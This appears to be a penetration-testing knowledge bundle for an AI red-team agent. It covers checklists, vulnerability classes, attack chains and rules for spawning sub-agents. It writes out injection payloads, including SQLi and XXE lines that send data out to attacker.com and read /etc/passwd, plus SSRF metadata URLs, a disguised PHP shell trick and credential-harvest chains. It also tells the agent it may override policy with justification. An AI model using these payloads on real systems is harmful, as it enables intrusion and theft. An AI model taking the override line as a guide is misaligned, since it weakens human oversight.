# Offensive Security Core Knowledge Bundle

This bundle provides comprehensive offensive security methodology for the Red Team agent. It combines essential techniques from multiple security domains to enable effective penetration testing across all target types.

## Fast-Checking Methodology

Speed-optimized checklist for rapid assessment and quick-win identification.

### Reconnaissance Quick Hits
- [ ] Map visible content (browse thoroughly, check API docs)
- [ ] Discover hidden content (directory/file brute force)
- [ ] Test for debug parameters
- [ ] Identify technologies (Wappalyzer, banner grabbing)
- [ ] Research known vulnerabilities in identified tech
- [ ] Gather tech-specific wordlists (Assetnote, SecLists)
- [ ] Identify all JavaScript files for analysis
- [ ] Find origin IP behind CDN/WAF (SecurityTrails, DNS history, cert transparency)

### Access Control Fast Check
- [ ] Test password quality and account lockout
- [ ] Test username enumeration (timing, error messages, status codes)
- [ ] Test account recovery (weak questions, token leakage, predictability)
- [ ] Test session handling (token security, rotation, CSRF protection)
- [ ] Test authorization (IDOR, horizontal/vertical privilege escalation)
- [ ] Test for BOLA (manipulate IDs in URL params, body, headers)
- [ ] Test for BFLA (access admin functions, try different HTTP methods)

### Input Validation Quick Wins
- [ ] SQL injection (test with ', --, /*, UNION, sqlmap)
- [ ] Reflected XSS (URL params, headers, test with `<script>alert(1)</script>`)
- [ ] Open redirect (check redirect params: `redirect`, `url`, `next`, `returnTo`)
- [ ] Path traversal (`../../../etc/passwd`, double encoding, mixed slashes)
- [ ] SSTI (inject template chars: `${{<%[%'"}}%\`, `{{7*7}}`, `${7*7}`)
- [ ] Command injection (`;id`, `|whoami`, backticks, $() substitution)
- [ ] XXE (XML inputs, SVG/DOCX uploads, external entity injection)

### Business Logic Quick Tests
- [ ] Test client-side input validation bypass
- [ ] Test race conditions (TOCTOU, limit bypass)
- [ ] Test for price/quantity manipulation
- [ ] Test transaction logic for double-spend or replay

### File Upload Quick Tests
- [ ] Test executable types (PHP, ASP, JSP)
- [ ] Test alternative extensions (.phtml, .php5, .aspx)
- [ ] Test case sensitivity (.PhP)
- [ ] Modify Content-Type header
- [ ] Forge magic bytes (prepend GIF89a; to PHP shell)
- [ ] Test path traversal in filename

## Core Vulnerability Classes

### Memory Corruption Patterns

**Stack Buffer Overflow:**
- Occurs when writing beyond stack buffer boundaries
- Corrupts return addresses, saved frame pointers
- Exploitation: overwrite return address → redirect execution
- Modern mitigations: DEP, ASLR, stack canaries, CET
- Real-world: CVE-2024-27130 (QNAP), CVE-2023-4863 (libWebP)

**Heap Buffer Overflow:**
- Writing beyond heap-allocated buffer boundaries
- Corrupts heap metadata and adjacent objects
- Exploitation: corrupt heap structures → arbitrary write
- Heap exploitation techniques: tcache poisoning, safe-linking bypass
- Real-world: CVE-2023-4863 (libWebP heap overflow → RCE)

**Use-After-Free (UAF):**
- Using pointer after memory has been freed
- Heap spray/feng shui to control freed memory contents
- Exploitation: place fake object in freed location → control flow hijack
- Real-world: CVE-2024-2883 (Chrome ANGLE), CVE-2022-32250 (Linux netfilter)

**Integer Overflow/Underflow:**
- Arithmetic wraps when exceeding type limits
- Used for buffer sizes → allocation mismatch → heap overflow
- Signed/unsigned confusion especially dangerous
- Real-world: CVE-2024-38063 (Windows TCP/IP integer underflow → RCE)

**Type Confusion:**
- Treating one object type as another
- JIT compilers: incorrect type assumptions → bounds check elimination
- Exploitation: fake objects with controlled structure → arbitrary R/W
- Real-world: CVE-2024-7971 (V8 TurboFan type confusion)

**Format String:**
- User input as format string argument (`printf(user_input)`)
- `%x`/`%s` for arbitrary read, `%n` for arbitrary write
- Bypasses ASLR via info leaks, overwrites return addresses
- Real-world: CVE-2023-35086 (ASUS router format string → RCE)

### Logic and Race Vulnerabilities

**Race Conditions (TOCTOU):**
- Time gap between check and use
- Double-fetch: kernel reads user memory twice, attacker modifies between
- File system races: symlink attacks, concurrent modifications
- Real-world: CVE-2024-26218 (Windows TOCTOU), CVE-2023-4155 (Linux KVM double-fetch)

**Authentication/Authorization Logic Flaws:**
- Missing checks, state confusion, parameter tampering
- Session management flaws (fixation, hijacking)
- Real-world: CVE-2024-0012 (Palo Alto PAN-OS auth bypass)

**IOCTL/Syscall Handler Bugs:**
- Size confusion, buffer validation failures
- Trusting user pointers without probing
- Real-world: CVE-2023-21768 (Windows AFD.sys buffer size confusion → LPE)

### Web Application Core

**SQL Injection:**
- Union-based: `' UNION SELECT username,password FROM users--`
- Boolean blind: `' AND 1=1--` vs `' AND 1=2--`
- Time-based blind: `'; WAITFOR DELAY '00:00:05'--`
- Out-of-band: `'; EXEC master..xp_dirtree '\\attacker.com\a'--`
- Always use parameterized queries for prevention

**Cross-Site Scripting (XSS):**
- Reflected: URL params echoed in response
- Stored: persisted in database, affects other users
- DOM-based: client-side JavaScript vulnerabilities
- Payloads: `<script>alert(document.cookie)</script>`, `<img src=x onerror=alert(1)>`
- Prevention: escape output, Content Security Policy

**Server-Side Request Forgery (SSRF):**
- Force server to make requests to attacker-controlled or internal targets
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- Internal services: `http://localhost:6379/` (Redis), `http://192.168.1.1/admin`
- Prevention: allowlist destinations, disable redirects, validate URLs

**XXE (XML External Entity):**
- Inject external entities in XML: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- OOB exfiltration: `<!ENTITY % xxe SYSTEM "http://attacker.com/?data=%file;">`
- Targets: XML endpoints, file uploads (DOCX, SVG), SOAP
- Prevention: disable external entities in XML parser

### API Security

**JWT Vulnerabilities:**
- `alg: none` bypass (remove signature)
- Algorithm confusion (RS256 → HS256, sign with public key)
- Weak HMAC secret (brute-force with jwt_tool)
- `kid` parameter injection (SQL injection, path traversal)
- Missing claim validation (`exp`, `nbf`, `aud`, `iss`)

**GraphQL Vulnerabilities:**
- Introspection enabled → full schema exposure
- No depth/complexity limits → DoS via nested queries
- IDOR via ID manipulation in queries/mutations
- Batching abuse → amplification attacks

**OAuth Flow Issues:**
- `redirect_uri` validation bypass (open redirect, path traversal)
- Missing/weak `state` parameter → CSRF
- Token leakage via Referer header (Implicit flow)
- Scope escalation → access beyond granted permissions

### Infrastructure

**Kubernetes Misconfigurations:**
- Exposed Kubelet API (port 10250) without auth
- Default Service Account with excessive permissions
- Missing Pod Security Policies/Standards
- Privileged pods, host path mounts, host networking
- Access to Docker socket (`/var/run/docker.sock`)

**Cloud Misconfigurations:**
- Publicly accessible storage (S3, Azure blob, GCS)
- Weak IAM permissions/roles
- SSRF to metadata service (`169.254.169.254`)
- Unrestricted network ingress/egress rules

## Attack Chain Construction

### Typical Chain Patterns

**Web App → Database:**
1. SQLi in search parameter → database access
2. Extract credentials → lateral movement
3. Privilege escalation → full compromise

**API → Infrastructure:**
1. JWT algorithm confusion → API admin access
2. SSRF via API → cloud metadata access
3. Stolen IAM credentials → infrastructure compromise

**Network → Lateral Movement:**
1. Default credentials → initial access
2. Credential harvest (SSH keys, env vars, configs)
3. SSH key reuse → pivot to other hosts
4. Repeat credential harvest → domain spread

**IDOR → Data Exfiltration:**
1. IDOR in user profile endpoint → enumerate all users
2. Missing rate limiting → automated scraping
3. Combine with XSS → session hijacking
4. Admin access → full database export

## When to Spawn Specialists

Spawn domain specialists when you discover:

- **Web Application** (20+ endpoints, complex auth, custom logic) → `web-app-specialist`
- **API** (GraphQL, JWT/OAuth, microservices, 15+ endpoints) → `api-specialist`
- **Binary/Compiled Code** (crashes, anomalies, reverse engineering needed) → `binary-specialist`
- **AI/LLM Service** (chatbots, code generation, any LLM interface) → `ai-security-specialist`

Always explain spawn reasoning to user. In Balanced mode, you can override policy with justification.

## Evidence and Validation

For every finding:
- Create EvidenceNode with ValidationStatus::Pending
- Include provenance (command, output excerpt, timestamp)
- Set initial severity and confidence
- Describe reproduction steps clearly
- Note affected target and impact

Validator will transition to: Confirmed, Revised, FalsePositive, or InfoOnly.
